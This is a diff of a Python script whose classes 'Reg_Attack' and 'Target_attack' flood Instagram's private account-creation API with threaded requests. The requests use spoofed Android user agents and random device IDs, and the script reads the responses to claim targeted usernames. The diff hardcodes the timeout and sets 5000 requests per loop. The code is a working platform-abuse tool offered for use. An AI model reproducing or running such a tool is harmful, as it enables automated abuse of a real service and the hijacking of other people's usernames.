@@ -20,11 +20,10 @@ except Exception as a:
 url_two = 'https://b.i.instagram.com/api/v1/accounts/create_business/'
 
 class Reg_Attack():
-    def __init__(self,trd,Timeout,Loops):
+    def __init__(self,trd):
         self.attemp = 0
         self.threads = trd
-        self.Timeout = Timeout
-        self.Loops = Loops
+        self.Timeout = 20
         self.us = [
             "Instagram 135.0.0.34.124 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)",
             "Instagram 135.0.0.34.124 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)",
@@ -105,7 +104,7 @@ class Reg_Attack():
                     'username': self.user,
                     'first_name': self.name,
                     'device_id': str(uuid.uuid4()),
-                    "phone_id": str(uuid.uuid4())}, cookies={"csrftoken": "missing","mid":"missing", "ds_user_id": f"{self.ds_user}","rur":"FRC","Ig-U-Ig-Direct-Region-Hint": "ASH"},headers=head) for i in range(self.Loops)]
+                    "phone_id": str(uuid.uuid4())}, cookies={"csrftoken": "missing","mid":"missing", "ds_user_id": f"{self.ds_user}","rur":"FRC","Ig-U-Ig-Direct-Region-Hint": "ASH"},headers=head) for i in range(5000)]
                 for future in as_completed(futures):
                     resp = future.result()
                     #print(self.user)
@@ -180,7 +179,7 @@ class Reg_Attack():
         while self.run:
             self.be_for_Attack()
 class Target_attack():
-    def __init__(self,trd,Timeout):
+    def __init__(self,trd):
         self.attemp = 0
         self.threads = trd
         self.us = [
@@ -189,7 +188,7 @@ class Target_attack():
                     "Instagram 135.0.0.34.124 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)",
                     "Instagram 135.0.0.34.124 Android (28/9; 380dpi; 1080x2147; OnePlus; HWEVA; OnePlus6T; qcom; en_US; 146536611)",
         ]
-        self.Timeout = Timeout
+        self.Timeout = 20
         self.name = str("Dady Rayan is Hare")
         self.bad = ["signup_block","few minutes","feedback_required","generic_request_error" ]
         self.SUCCESS_responses = ["challenge_required", "challenge", "email_is_taken, username_is_taken",]
@@ -353,15 +352,10 @@ def Reg_Attack2():
     ask = int(input("1-list - 2-Target : "))
     if ask == 1:
         trd = int(input("Threads : "))
-        Timeout = int(input("Timeout : "))
-        Loops = int(input("Loops : "))
-        Reg = Reg_Attack(trd,Timeout,Loops)
+        Reg = Reg_Attack(trd)
     elif ask == 2:
         trd = int(input("Threads : "))
-        Timeout = int(input("Timeout : "))
-        Reg = Target_attack(trd, Timeout)
-    while 1:
-        Reg()
+        Reg = Target_attack(trd)
 
 
 Reg_Attack2()
